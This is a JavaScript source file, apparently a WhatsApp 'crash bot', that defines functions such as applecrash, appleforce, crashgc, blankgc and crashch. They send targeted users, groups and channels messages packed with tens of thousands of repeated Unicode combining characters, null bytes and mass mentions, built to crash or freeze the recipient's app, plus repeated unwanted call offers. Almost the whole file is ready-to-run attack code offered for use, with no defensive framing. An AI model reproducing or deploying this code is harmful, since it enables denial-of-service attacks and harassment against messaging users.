        caption: "\u200B".repeat(50000) + i + "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000),

        mentions: mention ? [target] : [],
        footer: "\n",
        templateButtons: [
          {
            index: 1,
            urlButton: {
              displayText: "𑜦𑜠".repeat(5000) + "ꦽ".repeat(5000) + "ꦾ".repeat(5000) + "ោ៝".repeat(5000),
              url: "https://wa.me/stickerpack/sock"
            }
          }
        ],

        contextInfo: {
          ...(mention ? { mentionedJid: [target] } : {}),
          externalAdReply: {
            title: "Sticker Pack!!",
            body: "Marga #6VX Neverdiee!!",
            sourceUrl: "https://wa.me/stickerpack/sock",
            mediaType: 1,
            showAdAttribution: true
          }
        }
      })
    }

    for (const media of VaelVar) {
      await sock.sendMessage(target, media)
      if (mention) {
        await sock.sendMessage("status@broadcast", media)
      }
    }
  } catch (error) {
  }
}

//

async function applecrash1(target, mention) {
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: "Marga #6VX Neverdiee!!" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/VINSEXEJT1",
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "Marga #6VX Neverdiee!!" + s,
            matchedText: "",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
   }
};

async function applecrash2(target, mention) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "Marga #6VX Neverdiee!!" + "𖣂".repeat(15000),
         address: "" + "𖣂".repeat(5000),
         url: `https://whatsapp.${"𖣂".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "Marga #6VX Neverdiee!!",
            matchedText: "https://t.me/VINSEXEJT1",
            description: "".repeat(15000),
            title: "".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
   }
};

async function applecrash3(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "Marga #6VX Neverdiee!!" + "𑇂𑆵𑆴𑆿".repeat(1000),
        matchedText: "https://wa.me/stickerpack/sock",
        description: "҉҈⃝⃞⃟⃠⃤꙰꙲" + "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function applecrash4(sock, target) {
  try {
    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "Marga #6VX Neverdiee!!" + "𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "Marga #6VX Neverdiee!!" + "𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(5000),
      url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`
    }

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: { locationMessage }
        }
      },
      {}
    )

    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: 'meta',
          attrs: {},
          content: [
            {
              tag: 'mentioned_users',
              attrs: {},
              content: [
                {
                  tag: 'to',
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    })
  } catch (err) {
    console.error(err)
  }
}

//

async function appleforce1(sock, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "Marga #6VX Neverdiee!!" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/VINSEXEJT1",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function appleforce2(target, Ptcp = true) {
  await sock.relayMessage(target, {
      extendedTextMessage: {
        text: "Marga #6VX Neverdiee!!" + `${"ꦾ".repeat(103000)} ${"@1".repeat(25000)}`,
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                { jid: "13135550002@s.whatsapp.net", callOutcome: "1" }
              ]
            }
          },
          remoteJid: "13135550002@s.whastapp.net",
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 99999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: "IMAGE",
            jpegThumbnail: null,
            caption: "Marga #6VX Neverdiee!!"
          },
          placeholderKey: {
            remoteJid: "13135550002@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: `${"\0".repeat(2000)}`,
            body: `${"\0".repeat(2000)}`,
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: null,
            sourceType: "x",
            sourceId: "x",
            sourceUrl: "https://www.facebook.com/WhastApp",
            mediaUrl: "https://www.facebook.com/WhastApp",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: { url: "https://www.facebook.com/WhatsApp" },
          groupSubject: "Example Group Subject",
          parentGroupJid: "13135550002@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363330289360382@newsletter",
            serverMessageId: 1,
            newsletterName: "Marga #6VX Neverdiee!!",
            contentType: "UPDATE",
            accessibilityText: "Meta Ai"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          },
          smbriyuCampaignId: "smb_riyu_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: { showMmDisclosure: true }
        }
      }
    },
    Ptcp ? { participant: { jid: target } } : {}
  );
}

async function appleforce3(sock, target) {
  const crashText = "Marga #6VX Neverdiee!!" + "𑇂𑆵𑆴𑆿".repeat(60000);

  await sock.relayMessage(target, {
    extendedTextMessage: {
            text: "ោ៝".repeat(60000) + crashText.repeat(5000),
            matchedText: "ោ៝".repeat(15000),
            url: "https://t.me/VINSEXEJT1", 
            title: "\n",
            description: "ោ៝".repeat(10000), 
            previewType: 0,
            contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ), 
          ],
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 18144000
            },
          },
        },
      },
    }, { participant: { jid: target }, });
  }

async function appleforce4(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          jpegThumbnail: null,
          name: "Marga #6VX Neverdiee!!" + "\u0010" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
          address: "Marga #6VX Neverdiee!!" + "\u0010" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
          url: `https://xetxa.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined,
        }],
      }],
    }],
  });
}

//

async function offercall1(target) {
  try {
    await sock.offerCall(target);
  } catch (err) {
  console.error(err);
  }
}

async function offercall2(target) {
  try {
    await sock.offerCall(target, { video: true });
  } catch (err) {
  console.error(err);
  }
}

//

async function crashgc1(sock, groupId) {
  await sock.sendMessage(groupId, {
    text: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(2500),
    mentions: groupId,
    contextInfo: {
      mentionedJid: groupId,
      isGroupMention: true
    }
  });
}

//

async function blankgc1(sock, groupId) {
    await sock.relayMessage(groupId, {
    viewOnceMessage: {
      message: {
      interactiveMessage: {
      body: { text: "Marga #6VX Neverdiee!!".repeat(25000) },
           nativeFlowMessage: {
           messageParamsJson: JSON.stringify({
                payment_currency: "BTC",
                payment_amount: 0
             })
           }
         }
       }
     }
}, {});
}

//

async function crashch1(sock, targetChannel) {
  const msg = generateWAMessageFromContent(targetChannel, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: targetChannel });

  await sock.relayMessage(targetChannel, msg.message, { 
    messageId: msg.key.id 
  });
}

async function crashch2(sock, targetChannel) {
    await sock.relayMessage(targetChannel, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0000"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "review_order",
                                    buttonParamsJson: "\u0000".repeat(99999)
                                }
                            ]
                        }
                    }
                }
            }
        },
        {},
        { messageId: null }
    );
}

//

bot.launch()